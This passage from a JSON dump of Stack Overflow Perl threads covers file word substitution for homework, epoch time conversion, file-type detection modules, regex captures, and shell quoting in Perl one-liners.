"https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1494601159, "post_id": 43933728, "comment_id": 74913929, "body": "Using input output direction seems like a conflict with the homework situation, in the context of learning perl and not bash. The assignment requires &quot;program that reads the input.txt file&quot; not &quot;reads stdin&quot;. For the goal of efficient solution on the other hand, using a perl script in a file seems a waste, a commandline one-liner can do that. My respect however for noticing the case requirement. I missed that."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1494601336, "post_id": 43933728, "comment_id": 74914028, "body": "I&#39;m always in favour of interpreting homework requirement loosely if the student ends learning something that will be more useful in the real world."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1494601589, "post_id": 43933728, "comment_id": 74914199, "body": "Do so, it is a good case. But don&#39;t make traps for the student. I.e. explain where you consciously leave the assignment. Maybe provide an efficient solution and one for the homework. You should answer OPs question to be on topic, then put additional information in for the sake of other people reading the Q/A later."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1494601733, "post_id": 43933728, "comment_id": 74914295, "body": "But I believe that my solution solves the question that was asked. My program reads from the correct input file and writes to the correct output file if run using the example in my answer."}, {"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1494601904, "post_id": 43933728, "comment_id": 74914404, "body": "This is part of the question: &quot;Write a Perl program that reads the input.txt file...&quot;. We seem to be of different opinion whether your answer matches this. The extreme case would be doing the replacement in sed, then pipe through a print-only perl script."}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "reply_to_user": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1494602183, "post_id": 43933728, "comment_id": 74914654, "body": "And my code does read the correct input file and write the correct output file <b>when given the correct parameters</b>. As a bonus, it does many other things as well. I know that if I was a teacher and was given a solution like mine, I wouldn&#39;t penalise it in any way. It&#39;s fine that you disagree, of course, but I&#39;m not going to spend any longer discussing it."}], "tags": [], "owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "is_accepted": false, "score": 3, "last_activity_date": 1494581230, "last_edit_date": 1494581230, "creation_date": 1494580082, "answer_id": 43933728, "question_id": 43929942, "link": "https://stackoverflow.com/questions/43929942/how-to-write-a-program-that-reads-a-text-file-and-substitutes-certain-words-and/43933728#43933728", "title": "How to write a program that reads a text file and substitutes certain words and then outputs the text file under a different name", "body": "<p>The simplest way to write this is to use \"input/output direction\". This feature is available in all popular operating systems. This means that we write our code to read from STDIN and write to STDOUT and rely on the operating system to connect these to specific files.</p>\n\n<p>Using this technique, your code reduces to this:</p>\n\n<pre><code>#!/usr/bin/perl\n\nuse strict;\nuse warnings;\n\nwhile (&lt;&gt;) {\n  s/new/old/gi;\n  print;\n}\n</code></pre>\n\n<p>And (assuming that we store this in a file called <code>new2old</code>), we would call it like this:</p>\n\n<pre><code>$ ./new2old &lt; WK5input.txt &gt; output.txt\n</code></pre>\n\n<p>This way we avoid having to do all of that tedious mucking about with filehandles and end up with a program which is far more flexible. For example, we can pipe the output from another process into our program like this:</p>\n\n<pre><code>$ ls | ./new2old\n</code></pre>\n\n<p>Hard-coding filenames in a program is generally not the best approach.</p>\n"}, {"tags": [], "owner": {"reputation": 113221, "user_id": 100754, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/7804ebae32fbadef38537d74a915c22f?s=128&d=identicon&r=PG", "display_name": "Sinan &#220;n&#252;r", "link": "https://stackoverflow.com/users/100754/sinan-%c3%9cn%c3%bcr"}, "is_accepted": false, "score": 2, "last_activity_date": 1494594789, "creation_date": 1494594789, "answer_id": 43938657, "question_id": 43929942, "link": "https://stackoverflow.com/questions/43929942/how-to-write-a-program-that-reads-a-text-file-and-substitutes-certain-words-and/43938657#43938657", "title": "How to write a program that reads a text file and substitutes certain words and then outputs the text file under a different name", "body": "<p>First off, thank you for mentioning that this is homework. I would recommend telling your instructor that you got help completing the assignment. Here is some advice along with some enhancements:</p>\n\n<pre><code>#!/usr/bin/env perl\n\nuse strict;\nuse warnings;\n\n# Don't hardcode variable names, read them from\n# the command line. But, make sure you tell the\n# user what went wrong if they are not specified.\n\nif (@ARGV != 2) {\n    die \"Need input and output filenames\\n\";\n}\n\n# Assign the filenames\n\nmy ($infile, $outfile) = @ARGV;\n\n# Error messages due to open failure must indicate\n# the name of the file on which the operaton was\n# attempted and the nature of the operation.\n# By enclosing filenames in nonspace characters,\n# you make it obvious if there are some unexpected\n# characters in the name of the file.\n\nopen my $in, '&lt;', $infile\n    or die \"Cannot open '$infile' for reading: $!\";\n\nopen my $out, '&gt;', $outfile\n    or die \"Cannot open '$outfile' for writing: $!\";\n\nwhile (my $line = &lt;$in&gt;) {\n    # No need to chomp (remove the EOL) if you are just\n    # going to print lines to another file\n    $line =~ s/old/new/;\n\n    # There is no comma between the output filehandle and\n    # the string to be printed. If you put a comma, you will\n    # get the stringification of $out and $line both printed\n    # on STDOUT.\n    print $out $line;\n}\n\n# While lexical filehandles are automatically closed\n# when they go out of scope, it is good to explicitly\n# close them, especially handles opened for writing.\n#\n# We did not check if each print succeeded. This is\n# your last chance to find out if everything worked.\n\nclose $out\n    or die \"Failed to close output handle to '$outfile': $!\";\n\nclose $in\n    or die \"Failed to close input handle to '$infile': $!\";\n</code></pre>\n"}], "owner": {"reputation": 23, "user_id": 8000937, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf48b7e23b26e2b50ff3469dbdb5ee85?s=128&d=identicon&r=PG&f=1", "display_name": "Jet ", "link": "https://stackoverflow.com/users/8000937/jet"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 274, "favorite_count": 1, "accepted_answer_id": 43930535, "answer_count": 4, "score": 2, "last_activity_date": 1494682982, "creation_date": 1494566976, "last_edit_date": 1494580235, "question_id": 43929942, "link": "https://stackoverflow.com/questions/43929942/how-to-write-a-program-that-reads-a-text-file-and-substitutes-certain-words-and", "title": "How to write a program that reads a text file and substitutes certain words and then outputs the text file under a different name", "body": "<p>I've been struggling for the past 3 hours on this homework question and cannot seem to get anywhere.  I've searched online and watched youtube videos.</p>\n\n<p>The question is:\nWrite a Perl program that reads the input.txt file attached below and write a new file called output.txt. The new file should replace all occurrences (regardless of case) of the character string 'new' with 'old'.  </p>\n\n<p>This is what I have so far but can't seem to get anywhere.</p>\n\n<pre><code>use strict;\nuse warnings; \n\nmy $filename = 'WK5input.txt';\nopen(my $fh,  $filename)\n  or die \"Could not open file '$filename' $!\";\n\nwhile (my $row = &lt;$fh&gt;) {\n  chomp $row;\n  print \"$row\\n\";\n}\n\n$_ =~ s/new/old/g;\nopen( $fh, '&gt;', 'output.txt');\n\nprint $filename ;\nclose $filename;\n</code></pre>\n"}, {"tags": ["perl", "perforce"], "answers": [{"tags": [], "owner": {"reputation": 31669, "user_id": 3799759, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5820aa24337a2f622b78e92c39e3e3d6?s=128&d=identicon&r=PG", "display_name": "Samwise", "link": "https://stackoverflow.com/users/3799759/samwise"}, "is_accepted": true, "score": 2, "last_activity_date": 1494567646, "last_edit_date": 1494567646, "creation_date": 1494551652, "answer_id": 43927849, "question_id": 43927709, "link": "https://stackoverflow.com/questions/43927709/in-p4perl-what-is-the-time-format-that-is-returned/43927849#43927849", "title": "in p4perl what is the time format that is returned?", "body": "<p>Use <a href=\"http://perldoc.perl.org/functions/localtime.html\" rel=\"nofollow noreferrer\"><code>localtime</code></a> in conjunction with <a href=\"http://search.cpan.org/perldoc?POSIX\" rel=\"nofollow noreferrer\">POSIX</a>'s <code>strftime</code> to convert the <a href=\"https://en.wikipedia.org/wiki/Unix_time\" rel=\"nofollow noreferrer\">epoch timestamp</a> to something localized and human-readable.</p>\n"}], "owner": {"reputation": 747, "user_id": 590222, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/fba5be60a41679337637cdfba23bb4b1?s=128&d=identicon&r=PG", "display_name": "justrajdeep", "link": "https://stackoverflow.com/users/590222/justrajdeep"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 34, "favorite_count": 0, "closed_date": 1494551702, "accepted_answer_id": 43927849, "answer_count": 1, "score": -1, "last_activity_date": 1494567646, "creation_date": 1494550283, "question_id": 43927709, "link": "https://stackoverflow.com/questions/43927709/in-p4perl-what-is-the-time-format-that-is-returned", "closed_reason": "Duplicate", "title": "in p4perl what is the time format that is returned?", "body": "<p>I have started using <a href=\"https://www.perforce.com/perforce/r15.1/manuals/p4script/perl.p4.html\" rel=\"nofollow noreferrer\">p4perl</a>. When I run p4 change using the api it returns me a strange number in place of time.</p>\n\n<p>I am getting <code>time:1494525845</code> and when i see the <code>p4 describe</code> of the same i see that the time is <code>2017/05/11 14:04:05</code></p>\n\n<p>Does anyone know how to map the large number to a human readable format?</p>\n\n<p>Thanks in advance.</p>\n"}, {"tags": ["perl", "file", "file-type"], "answers": [{"comments": [{"owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "reply_to_user": {"reputation": 20550, "user_id": 327528, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/dfea36f0a3ab8c5f8ad73bcc6cea241a?s=128&d=identicon&r=PG", "display_name": "CJ7", "link": "https://stackoverflow.com/users/327528/cj7"}, "edited": false, "score": 0, "creation_date": 1494554254, "post_id": 43927754, "comment_id": 74889327, "body": "@CJ7 I wouldn&#39;t be surprised if docx is compressed with zlib. You might have to combine this with a database of file extensions."}, {"owner": {"reputation": 20550, "user_id": 327528, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/dfea36f0a3ab8c5f8ad73bcc6cea241a?s=128&d=identicon&r=PG", "display_name": "CJ7", "link": "https://stackoverflow.com/users/327528/cj7"}, "edited": false, "score": 0, "creation_date": 1494554518, "post_id": 43927754, "comment_id": 74889391, "body": "I&#39;m only using this for files that for some reason don&#39;t have extensions."}], "tags": [], "owner": {"reputation": 126333, "user_id": 14660, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/e55e0ec3c00f834d78fbdddeaa36e308?s=128&d=identicon&r=PG", "display_name": "Schwern", "link": "https://stackoverflow.com/users/14660/schwern"}, "is_accepted": false, "score": 5, "last_activity_date": 1494551158, "last_edit_date": 1494551158, "creation_date": 1494550706, "answer_id": 43927754, "question_id": 43927658, "link": "https://stackoverflow.com/questions/43927658/perl-module-for-file-command/43927754#43927754", "title": "Perl module for &#39;file&#39; command?", "body": "<p>If you know you'll be on a sane Unix, you can just make a system call to <code>file</code>.</p>\n\n<p>If you need an independent implementation, <a href=\"https://metacpan.org/search?size=20&amp;q=file+magic\" rel=\"noreferrer\">there are several available on CPAN</a>. Probably the closest to <code>file</code> is <a href=\"https://metacpan.org/pod/File::MMagic\" rel=\"noreferrer\">File::MMagic</a>. This is its own implementation, so it will work on any system, but might not act exactly like <code>file</code>.</p>\n\n<pre><code>$ head test.pl\n#!/usr/bin/env perl\n\nuse strict;\nuse warnings;\n\n$ file test.pl\ntest.pl: a /usr/bin/env perl script text executable, ASCII text\n\n$ perl -wlE 'use File::MMagic; $mm = File::MMagic-&gt;new; say $mm-&gt;checktype_filename(shift)' test.pl\nx-system/x-unix;  executable /usr/bin/env script text\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 38072, "user_id": 46395, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5ce828f20abb195ef5d971205ee36c27?s=128&d=identicon&r=PG", "display_name": "daxim", "link": "https://stackoverflow.com/users/46395/daxim"}, "is_accepted": false, "score": 2, "last_activity_date": 1494883792, "creation_date": 1494883792, "answer_id": 43989112, "question_id": 43927658, "link": "https://stackoverflow.com/questions/43927658/perl-module-for-file-command/43989112#43989112", "title": "Perl module for &#39;file&#39; command?", "body": "<p>File::MMagic's <a href=\"https://metacpan.org/source/KNOK/File-MMagic-1.30/MMagic.pm#L1415\" rel=\"nofollow noreferrer\">built-in magic</a> is so short, it's useless. Avoid.</p>\n\n<p>Instead use <a href=\"http://p3rl.org/File::LibMagic#RELATED-MODULES\" rel=\"nofollow noreferrer\">File::LibMagic</a>, it's the best.</p>\n\n<pre><code>$ perl -mFile::LibMagic -MDDS -E \\\n    'say Dump(File::LibMagic-&gt;new\n        -&gt;info_from_filename(\"Startopia EULA English.docx\"))'\n$HASH1 = {\n    description  =&gt; 'Microsoft Word 2007+',\n    encoding     =&gt; 'binary',\n    mime_type    =&gt; 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',\n    mime_with_encoding =&gt; 'application/vnd.openxmlformats-officedocument.wordprocessingml.document; charset=binary'\n};\n</code></pre>\n"}], "owner": {"reputation": 20550, "user_id": 327528, "user_type": "registered", "accept_rate": 37, "profile_image": "https://www.gravatar.com/avatar/dfea36f0a3ab8c5f8ad73bcc6cea241a?s=128&d=identicon&r=PG", "display_name": "CJ7", "link": "https://stackoverflow.com/users/327528/cj7"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 376, "favorite_count": 1, "answer_count": 2, "score": 5, "last_activity_date": 1494883792, "creation_date": 1494549697, "question_id": 43927658, "link": "https://stackoverflow.com/questions/43927658/perl-module-for-file-command", "title": "Perl module for &#39;file&#39; command?", "body": "<p>On a Linux system I can use the <code>file</code> command to detect the type of a file.</p>\n\n<p>Is there a <code>perl</code> module that encapsulates this command?</p>\n"}, {"tags": ["perl", "design-patterns", "pattern-matching", "match"], "comments": [{"owner": {"reputation": 1949, "user_id": 749632, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84b66b933a86333dcf1178eeca465efc?s=128&d=identicon&r=PG", "display_name": "user749632", "link": "https://stackoverflow.com/users/749632/user749632"}, "edited": false, "score": 0, "creation_date": 1494541360, "post_id": 43926504, "comment_id": 74886218, "body": "so @all_matches should have"}, {"owner": {"reputation": 1949, "user_id": 749632, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84b66b933a86333dcf1178eeca465efc?s=128&d=identicon&r=PG", "display_name": "user749632", "link": "https://stackoverflow.com/users/749632/user749632"}, "edited": false, "score": 0, "creation_date": 1494541396, "post_id": 43926504, "comment_id": 74886234, "body": "all_matches[0] is regbus_s_partially_resident all_matches[1] is reg_two"}], "answers": [{"tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": false, "score": 2, "last_activity_date": 1494542590, "last_edit_date": 1494542590, "creation_date": 1494542121, "answer_id": 43926650, "question_id": 43926504, "link": "https://stackoverflow.com/questions/43926504/match-multiple-patterns-and-extract-subpatterns-into-a-array-in-perl/43926650#43926650", "title": "match multiple patterns and extract subpatterns into a array in perl", "body": "<p>Need a little tweak to your regex</p>\n\n<pre><code>my @all_matches = $str =~ m/\\W(reg_\\w+|regbus_\\w+)/g;\n</code></pre>\n\n<p>or</p>\n\n<pre><code>my @all_matches = $str =~ m/\\W( (?:reg|regbus)_\\w+ )/gx;\n</code></pre>\n\n<p>or even something along the lines of</p>\n\n<pre><code>my @all_matches = $str =~ m/\\W( reg(?:bus)?_\\w+ )/gx;\n</code></pre>\n\n<p>The most suitable form depends on what patterns you may need and how this is used.</p>\n\n<p>Or, reduce the regex use to the heart of the problem</p>\n\n<pre><code>my @matches = grep { /^(?:reg_\\w+|regbus_\\w+)/ } split /\\W/, $str;\n</code></pre>\n\n<p>what may be helpful if your strings and/or requirements grow more complex.</p>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 2, "last_activity_date": 1494542491, "last_edit_date": 1494542491, "creation_date": 1494542179, "answer_id": 43926666, "question_id": 43926504, "link": "https://stackoverflow.com/questions/43926504/match-multiple-patterns-and-extract-subpatterns-into-a-array-in-perl/43926666#43926666", "title": "match multiple patterns and extract subpatterns into a array in perl", "body": "<blockquote>\n  <p><em>its copying the non-word character also into the array list</em></p>\n</blockquote>\n\n<p>No, it doesn't.</p>\n\n<pre><code>$ perl -le'\n   my $str = \"assign (rregbus_z_partially_resident | regbus_s_partially_resident | reg_two | )regbus_;\";\n   my (@all_matches) = ($str =~ m/\\W(reg_\\w+)|\\W(regbus_\\w+)/g);\n   print $_ // \"[undef]\" for @all_matches;\n'\n[undef]\nregbus_s_partially_resident\nreg_two\n[undef]\n</code></pre>\n\n<p>But you do have a problem: You have two captures, so you will get two values per match.</p>\n\n<p>Fix:</p>\n\n<pre><code>my @all_matches;\npush @all_matches, $1 // $2 while $str =~ m/\\W(reg_\\w+)|\\W(regbus_\\w+)/g;\n</code></pre>\n\n<p>Far better:</p>\n\n<pre><code>my @all_matches = $str =~ m/\\W(reg(?:bus)?_\\w+)/g;\n</code></pre>\n\n<p>Ever better yet:</p>\n\n<pre><code>my @all_matches = $str =~ m/\\b(reg(?:bus)?_\\w+)/g;\n</code></pre>\n"}], "owner": {"reputation": 1949, "user_id": 749632, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84b66b933a86333dcf1178eeca465efc?s=128&d=identicon&r=PG", "display_name": "user749632", "link": "https://stackoverflow.com/users/749632/user749632"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 2602, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1494542590, "creation_date": 1494541304, "last_edit_date": 1494542158, "question_id": 43926504, "link": "https://stackoverflow.com/questions/43926504/match-multiple-patterns-and-extract-subpatterns-into-a-array-in-perl", "title": "match multiple patterns and extract subpatterns into a array in perl", "body": "<p>I have the following string in <code>$str</code>:</p>\n\n<pre><code>assign (rregbus_z_partially_resident | regbus_s_partially_resident | reg_two | )regbus_;\n</code></pre>\n\n<p>I want to parse this line and only capture all the string that starts with non-word character followed by either <code>reg_\\w+</code> or <code>regbus_\\w+</code> into an array.</p>\n\n<p>so in the above example, i want to capture only \n<code>regbus_s_partially_resident</code> and <code>reg_two</code> into a array.</p>\n\n<p>I tried this and it didnot work:</p>\n\n<pre><code>my (@all_matches) = ($str =~ m/\\W(reg_\\w+)|\\W(regbus_\\w+)/g);\n</code></pre>\n\n<p>Since i am trying to use <code>\\W</code>, its copying the non-word character also into the array list, which i donot want.</p>\n"}, {"tags": ["perl", "shell", "double-quotes", "single-quotes"], "comments": [{"owner": {"reputation": 72378, "user_id": 183172, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Vhpvg.jpg?s=128&g=1", "display_name": "martin clayton", "link": "https://stackoverflow.com/users/183172/martin-clayton"}, "edited": false, "score": 4, "creation_date": 1494539847, "post_id": 43926100, "comment_id": 74885683, "body": "Try: echo &quot;chomp;@a=split(/\\|/,$_);print $a[4];&quot;, no Perl involved, and you&#39;ll see what you are passing to Perl in the second case."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 72378, "user_id": 183172, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Vhpvg.jpg?s=128&g=1", "display_name": "martin clayton", "link": "https://stackoverflow.com/users/183172/martin-clayton"}, "edited": false, "score": 0, "creation_date": 1494544929, "post_id": 43926100, "comment_id": 74887265, "body": "@martinclayton  Nice. One thing -- the pipe in the question affects <code>$_</code> so that part won&#39;t be accurate.  (While data may not be piped at all in the actual problem, of course.)"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 72378, "user_id": 183172, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Vhpvg.jpg?s=128&g=1", "display_name": "martin clayton", "link": "https://stackoverflow.com/users/183172/martin-clayton"}, "edited": false, "score": 0, "creation_date": 1494545082, "post_id": 43926100, "comment_id": 74887303, "body": "@martinclayton Repeatedly executing this is entertaining :)"}], "answers": [{"tags": [], "owner": {"reputation": 371, "user_id": 5899488, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0914d0568002620ccfffae452801b107?s=128&d=identicon&r=PG&f=1", "display_name": "MBurnham", "link": "https://stackoverflow.com/users/5899488/mburnham"}, "is_accepted": false, "score": 1, "last_activity_date": 1494540213, "last_edit_date": 1494540213, "creation_date": 1494539889, "answer_id": 43926234, "question_id": 43926100, "link": "https://stackoverflow.com/questions/43926100/why-does-changing-from-to-affect-the-behavior-of-this-one-liner/43926234#43926234", "title": "why does changing from &#39; to &quot; affect the behavior of this one-liner?", "body": "<p>This is actual a shell topic, not a perl topic.</p>\n\n<p>In shell:</p>\n\n<p>Single quotes preserve the literal value of all of the characters they contain, including the $ and backslash. However, with double quotes, the $, backtick, and backslash characters have special meaning.</p>\n\n<p>For example:</p>\n\n<p><code>'\\\"'</code> evaluates to <code>\\\"</code></p>\n\n<p>whereas</p>\n\n<p><code>\"\\'\"</code> evaluates to just <code>'</code></p>\n\n<p>because with double quotes, the backslash gets a special meaning as the escape character.</p>\n"}, {"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494543582, "post_id": 43926258, "comment_id": 74886921, "body": "Actually, <code>$_</code> in many shells is the last argument of the most recent command, but if it were unassigned, the Perl code would look like <code>split(&#47;\\|&#47;,)</code> which defaults to <code>split(&#47;\\|&#47;, $_)</code> anyway. The real problem, as you say, is that <code>$a[4]</code> is reduced to <code>[4]</code>."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1494544053, "post_id": 43926258, "comment_id": 74887051, "body": "@Borodin  I think that it ends up empty because of the pipe.  (It did in my brief tests.)  However, I should and will explain it better, thank you very much."}], "tags": [], "owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "is_accepted": true, "score": 5, "last_activity_date": 1494625263, "last_edit_date": 1495541406, "creation_date": 1494539984, "answer_id": 43926258, "question_id": 43926100, "link": "https://stackoverflow.com/questions/43926100/why-does-changing-from-to-affect-the-behavior-of-this-one-liner/43926258#43926258", "title": "why does changing from &#39; to &quot; affect the behavior of this one-liner?", "body": "<p>With double quotes you are letting the shell interpolate variables first.</p>\n\n<p>As you can check, <code>$_</code> and <code>$a</code> are unset in the subshell forked for pipe by the parent shell. See a comment on <code>$_</code> below. </p>\n\n<p>So the double-quoted version is effectively</p>\n\n<pre><code>echo \"puke|1|2|3|puke2\" | perl -lne 'chomp;@a=split(/\\|/);print [4];'\n</code></pre>\n\n<p>what prints the arrayref <code>[4]</code>.</p>\n\n<hr>\n\n<p>A comment on the effects of having <code>$_</code> exposed to Bash.  Thanks to <a href=\"https://stackoverflow.com/users/622310/borodin\">Borodin</a> for bringing this up.</p>\n\n<p>The <code>$_</code> is one of a handful of <a href=\"https://www.gnu.org/software/bash/manual/html_node/Special-Parameters.html#index-_0024_005f\" rel=\"nofollow noreferrer\">special shell parameters</a> in Bash. It contains the last argument of the previous command, or the pathname of what invoked the shell or commands (via <code>_</code> environment variable).  See the link for a full description.</p>\n\n<p>However, here it is being interpreted in a subshell forked to run the <code>perl</code> command, its first. Apparently it is not even set, as seen with</p>\n\n<pre><code>echo hi;  echo hi | echo $_\n</code></pre>\n\n<p>which prints an empty line (after first <code>hi</code>). The reason may be that the <code>_</code> environment variable just isn't set for a subshell for a pipe, but I don't see why this would be the case.  For example,</p>\n\n<pre><code>echo hi; (echo $_)\n</code></pre>\n\n<p>prints two lines with <code>hi</code> even though <code>( )</code> starts a subshell.</p>\n\n<p>In any case, <code>$_</code> in the given pipeline isn't set.</p>\n\n<p>The <code>split</code> part is then <code>split(/\\|/)</code>, so via default <code>split(/\\|/, $_)</code> -- with nothing to split.  With <code>-w</code> added this indeed prints a warning for use of uninitialized <code>$_</code>.</p>\n\n<p>Note that this behavior depends on the shell. The <code>tcsh</code> won't run this with double quotes at all. In <code>ksh</code> and <code>zsh</code> the last part of pipeline runs in the main shell, not a subshell, so <code>$_</code> is there.</p>\n"}], "owner": {"reputation": 338, "user_id": 4705722, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/b0292cef8a0a90ed57d525ed015438eb?s=128&d=identicon&r=PG&f=1", "display_name": "sail0r", "link": "https://stackoverflow.com/users/4705722/sail0r"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 63, "favorite_count": 0, "accepted_answer_id": 43926258, "answer_count": 2, "score": 1, "last_activity_date": 1494625263, "creation_date": 1494539198, "last_edit_date": 1494574007, "question_id": 43926100, "link": "https://stackoverflow.com/questions/43926100/why-does-changing-from-to-affect-the-behavior-of-this-one-liner", "title": "why does changing from &#39; to &quot; affect the behavior of this one-liner?", "body": "<p>Why is it that simply changing from enclosing my one-liner with <code>'</code> instead of <code>\"</code> affects the behavior of the code? The first line of code produces what is expected and the second line of code gives (to me!) an unexpected result, printing out an unexpected array reference.</p>\n\n<pre><code>$ echo \"puke|1|2|3|puke2\" | perl -lne 'chomp;@a=split(/\\|/,$_);print $a[4];'\npuke2\n$ echo \"puke|1|2|3|puke2\" | perl -lne \"chomp;@a=split(/\\|/,$_);print $a[4];\"\n</code></pre>\n\n<p>This is the Perl version:</p>\n\n<pre><code>$ perl -v\n\nThis is perl, v5.10.1 (*) built for x86_64-linux-thread-multi\n\nARRAY(0x1f79b98)\n</code></pre>\n"}, {"tags": ["perl", "process"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 3, "creation_date": 1494538701, "post_id": 43925585, "comment_id": 74885200, "body": "Tip: Avoid negative signal numbers. It can cause confusion. (For example, shell command <code>kill -9 $pid</code> sends the signal the the process, not the process group.) 